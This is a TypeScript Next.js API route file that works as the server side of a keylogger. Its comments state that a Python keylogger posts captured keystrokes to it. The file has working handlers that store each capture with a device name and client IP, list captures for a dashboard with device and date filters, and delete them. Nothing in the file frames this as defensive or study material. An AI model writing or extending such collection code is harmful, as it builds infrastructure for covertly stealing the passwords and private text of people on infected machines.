import type { NextRequest } from "next/server";
import {
  errorResponse,
  getClientIp,
  successResponse,
  validateApiKey,
} from "@/lib/auth";
import {
  addLog,
  clearLogs,
  getLogs,
  getLogsByDateRange,
  type LogEntry,
} from "@/lib/db";

// ============================================================
// POST /api/logs — Receive keystrokes from Python client
// ============================================================
//
// The Python keylogger sends captured keystrokes here.
//
// Headers:
//   x-api-key: <your-api-key>
//   Content-Type: application/json
//
// Body:
//   {
//     "device": "LAPTOP-01",
//     "data": "Hello World[ENTER]"
//   }
//
// Response:
//   201: { success: true, message: "Log saved", entry: { ... } }
//   400: { success: false, error: "..." }
//   401: { success: false, error: "Unauthorized" }
//   500: { success: false, error: "Internal server error" }

export async function POST(request: NextRequest) {
  // 1. Validate API key
  if (!validateApiKey(request)) {
    return errorResponse("Unauthorized. Invalid or missing API key.", 401);
  }

  // 2. Parse the request body
  let body: { device?: string; data?: string };

  try {
    body = await request.json();
  } catch {
    return errorResponse("Invalid JSON body.", 400);
  }

  // 3. Validate required fields
  const { device, data } = body;

  if (!device || typeof device !== "string" || device.trim().length === 0) {
    return errorResponse("Missing or invalid 'device' field.", 400);
  }

  if (!data || typeof data !== "string" || data.trim().length === 0) {
    return errorResponse("Missing or invalid 'data' field.", 400);
  }

  // 4. Get client IP address
  const ip = getClientIp(request);

  // 5. Save to database
  try {
    const entry = await addLog(device.trim(), data, ip);

    return successResponse(
      {
        message: "Log entry saved successfully.",
        entry,
      },
      201,
    );
  } catch (error) {
    console.error("[API POST /api/logs] Failed to save log:", error);
    return errorResponse("Internal server error.", 500);
  }
}

// ============================================================
// GET /api/logs — Fetch logs for the dashboard
// ============================================================
//
// Query parameters (all optional):
//   ?device=LAPTOP-01      Filter by device name
//   ?start=2025-01-01      Filter by start date (ISO string)
//   ?end=2025-01-31        Filter by end date (ISO string)
//   ?limit=50              Limit number of results (default: 100)
//   ?offset=0              Offset for pagination (default: 0)
//
// Headers:
//   x-api-key: <your-api-key>
//
// Response:
//   200: { success: true, logs: [...], total: number, limit: number, offset: number }
//   401: { success: false, error: "Unauthorized" }
//   500: { success: false, error: "Internal server error" }

export async function GET(request: NextRequest) {
  // 1. Validate API key
  if (!validateApiKey(request)) {
    return errorResponse("Unauthorized. Invalid or missing API key.", 401);
  }

  // 2. Parse query parameters
  const { searchParams } = new URL(request.url);
  const device = searchParams.get("device") ?? undefined;
  const startDate = searchParams.get("start") ?? undefined;
  const endDate = searchParams.get("end") ?? undefined;
  const limit = Math.min(Number(searchParams.get("limit") ?? 100), 500);
  const offset = Number(searchParams.get("offset") ?? 0);

  try {
    // 3. Fetch logs with optional filters
    let logs: LogEntry[];

    if (startDate && endDate) {
      logs = await getLogsByDateRange(startDate, endDate, device);
    } else {
      logs = await getLogs(device);
    }

    // 4. Apply pagination
    const total = logs.length;
    const paginated = logs.slice(offset, offset + limit);

    return successResponse({
      logs: paginated,
      total,
      limit,
      offset,
    });
  } catch (error) {
    console.error("[API GET /api/logs] Failed to fetch logs:", error);
    return errorResponse("Internal server error.", 500);
  }
}

// ============================================================
// DELETE /api/logs — Clear all logs or logs for a specific device
// ============================================================
//
// Query parameters (optional):
//   ?device=LAPTOP-01      Only delete logs for this device
//
// Headers:
//   x-api-key: <your-api-key>
//
// Response:
//   200: { success: true, message: "...", deleted: number }
//   401: { success: false, error: "Unauthorized" }
//   500: { success: false, error: "Internal server error" }

export async function DELETE(request: NextRequest) {
  // 1. Validate API key
  if (!validateApiKey(request)) {
    return errorResponse("Unauthorized. Invalid or missing API key.", 401);
  }

  // 2. Parse optional device filter
  const { searchParams } = new URL(request.url);
  const device = searchParams.get("device") ?? undefined;

  try {
    const deleted = await clearLogs(device);

    const target = device ? `device '${device}'` : "all devices";

    return successResponse({
      message: `Cleared ${deleted} log(s) for ${target}.`,
      deleted,
    });
  } catch (error) {
    console.error("[API DELETE /api/logs] Failed to clear logs:", error);
    return errorResponse("Internal server error.", 500);
  }
}
